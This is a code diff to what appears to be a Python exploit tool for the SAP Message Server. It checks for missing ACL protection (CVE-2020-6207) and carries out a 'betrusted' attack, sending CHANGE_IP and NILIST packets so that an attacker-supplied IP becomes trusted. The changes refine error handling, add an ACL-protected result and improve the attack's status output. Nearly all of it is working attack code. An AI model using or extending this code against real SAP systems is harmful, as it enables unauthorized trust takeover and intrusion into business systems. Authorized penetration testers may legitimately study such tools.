@@ -149,10 +149,10 @@ def ni_recv(sock: socket.socket, timeout: float = 10.0) -> bytes:
 
 
 def ni_try_recv(sock: socket.socket, timeout: float = 5.0) -> bytes | None:
-    """Try to receive one NI frame; return None on timeout."""
+    """Try to receive one NI frame; return None on timeout or connection close."""
     try:
         return ni_recv(sock, timeout)
-    except (socket.timeout, TimeoutError):
+    except (socket.timeout, TimeoutError, ConnectionError, OSError):
         return None
 
 
@@ -466,9 +466,11 @@ def _wait_and_reply_nilist(sock: socket.socket, fromname: str, key: bytes,
                 ni_send(sock, reply)
                 return True
 
+        opc = ms_parse_opcode(pkt)
         logger.debug(
             f"MS packet: flag={flag:#04x} iflag={iflag:#04x} "
-            f"msgtype={hdr.get('msgtype', 0):#04x} len={len(pkt)}"
+            f"msgtype={hdr.get('msgtype', 0):#04x} "
+            f"opcode={opc.get('opcode', -1):#04x} len={len(pkt)}"
         )
 
     return False
@@ -508,15 +510,19 @@ def check_ms_acl(host: str, port: int, timeout: float = 10.0) -> dict:
     session key, it is unauthenticated and vulnerable to the betrusted attack.
 
     Returns:
-        vulnerable:  bool — True if MS lacks ACL protection
-        session_key: str  — hex session key from MS login reply
-        ms_name:     str  — MS server name from login reply
-        error:       str  — error message if check failed
+        vulnerable:    bool — True if MS lacks ACL protection
+        acl_protected: bool — True if MS is accessible but ACL blocks our IP
+        session_key:   str  — hex session key from MS login reply
+        ms_name:       str  — MS server name from login reply
+        errorno:       int  — raw MS error number from login reply (0 = success)
+        error:         str  — error message if check failed
     """
     result = {
         "vulnerable": False,
+        "acl_protected": False,
         "session_key": "",
         "ms_name": "",
+        "errorno": 0,
         "error": "",
     }
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -532,8 +538,16 @@ def check_ms_acl(host: str, port: int, timeout: float = 10.0) -> dict:
             result["error"] = "No valid SAPMS header in response"
             return result
 
-        if hdr.get("errorno", 1) != 0:
-            result["error"] = f"MS rejected login: errorno={hdr['errorno']}"
+        errorno = hdr.get("errorno", 1)
+        result["errorno"] = errorno
+
+        if errorno != 0:
+            result["acl_protected"] = True
+            result["ms_name"] = hdr.get("fromname", "")
+            result["error"] = (
+                f"MS rejected login (errorno={errorno}) — "
+                f"ACL is configured, betrusted not possible from this IP"
+            )
             return result
 
         key = hdr.get("key", b"\x00" * 8)
@@ -660,21 +674,26 @@ def betrusted(host: str, port: int, attacker_ip: str,
         # ---- Wait for MS NILIST request (accelerates trust propagation) ----
         if nilist_wait > 0:
             print(f"[*] Waiting up to {nilist_wait:.0f}s for NILIST request from MS...")
-            got = _wait_and_reply_nilist(
-                sock, our_name, key, attacker_ip, nilist_wait,
-                kernel_new=kernel_new,
-            )
+            try:
+                got = _wait_and_reply_nilist(
+                    sock, our_name, key, attacker_ip, nilist_wait,
+                    kernel_new=kernel_new,
+                )
+            except (ConnectionError, OSError):
+                # MS closed the connection — that's OK; attack packets were already sent
+                got = False
+                logger.debug("MS closed connection during NILIST wait (expected on some kernels)")
             if got:
                 result["nilist_response"] = True
                 print(f"[+] Replied to NILIST request with {attacker_ip}")
             else:
                 print(
-                    f"[!] No NILIST request in {nilist_wait:.0f}s — "
-                    f"MS may propagate on next cycle (~5 min) or used TCP source IP"
+                    f"[!] No NILIST request received — "
+                    f"CHANGE_IP + NILIST ADM already sent; MS propagates on next cycle"
                 )
 
         # Give MS a moment to process before we disconnect
-        time.sleep(1)
+        time.sleep(0.5)
 
         # ---- Logout cleanly ------------------------------------------------
         try:
@@ -728,12 +747,13 @@ def sapmap_check_ms(host: str, instance_nr: int, timeout: float = 5.0) -> dict:
     """
     port = ms_port(instance_nr)
     result = {
-        "port":        port,
-        "accessible":  False,
-        "vulnerable":  False,
-        "session_key": "",
-        "ms_name":     "",
-        "error":       "",
+        "port":          port,
+        "accessible":    False,
+        "vulnerable":    False,
+        "acl_protected": False,
+        "session_key":   "",
+        "ms_name":       "",
+        "error":         "",
     }
 
     acc = check_ms_accessible(host, port, timeout)
@@ -743,10 +763,11 @@ def sapmap_check_ms(host: str, instance_nr: int, timeout: float = 5.0) -> dict:
         return result
 
     acl = check_ms_acl(host, port, timeout)
-    result["vulnerable"]  = acl["vulnerable"]
-    result["session_key"] = acl["session_key"]
-    result["ms_name"]     = acl["ms_name"]
-    result["error"]       = acl["error"]
+    result["vulnerable"]    = acl["vulnerable"]
+    result["acl_protected"] = acl.get("acl_protected", False)
+    result["session_key"]   = acl["session_key"]
+    result["ms_name"]       = acl["ms_name"]
+    result["error"]         = acl["error"]
     return result
 
 
@@ -834,8 +855,12 @@ def main() -> None:
             print(f"[+] VULNERABLE: MS lacks ACL protection (CVE-2020-6207)")
             print(f"    MS server name : {result['ms_name']!r}")
             print(f"    Session key    : {result['session_key']}")
+        elif result.get("acl_protected"):
+            print(f"[~] ACL PROTECTED: Port accessible but MS blocks this IP")
+            print(f"    errorno        : {result['errorno']}")
+            print(f"    betrusted requires a whitelisted IP (SAP host, SAPRouter, etc.)")
         else:
-            print(f"[-] NOT vulnerable (or ACL protected): {result['error']}")
+            print(f"[-] NOT accessible: {result['error']}")
         sys.exit(0 if result["vulnerable"] else 1)
 
     elif args.command == "exploit":
